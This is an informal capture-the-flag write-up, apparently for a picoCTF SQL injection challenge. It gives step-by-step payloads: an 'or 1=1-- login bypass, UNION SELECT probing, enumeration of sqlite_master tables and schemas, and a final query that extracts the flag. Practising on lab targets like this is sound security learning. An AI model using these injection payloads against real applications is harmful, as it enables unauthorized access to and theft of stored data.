## pico !!!

![qz](pic/qz.png)
<br>

![start](pic/start.png)
<br>
today we do doing sqli qz.
<br>
let's into the qz.<br>

![testing](pic/testing_1.png)
<br>
the First qz It's easy we input the <br>

admin <br>
and <br>
'''
'or 1=1--
'''
<br>

![fO](pic/findOffice.png)
<br>
when i am using the /'union select 1,2,3--/ It won work so I am change a little bit<br>

'''
Lagos'union select 1,2,3--
'''
<br>

![ft](pic/foundtablen.png)
<br>

perfect, we found the table and different column.<br>
after that , I am stuck.<br>
so I search how to found the table.<br>
and i got this<br>

'''
'union SELECT name,1,2 FROM sqlite_master WHERE type='table'--
'''
<br>

![of2](pic/office2.png)
<br>
I think we need found the office table.<br>
we need this<br>
'''
'union SELECT name,sql,2 FROM sqlite_master WHERE type='table'--
'''
<br>

this is using for what part this table have<br>

![of3](pic/office3.png)
<br>
we are close the answer<br>
we using this command to get the flag<br>

'''
'union SELECT id,flag,2 FROM more_table--
'''
<br>

![flag](pic/flag.png)
<br>

let's goooo!


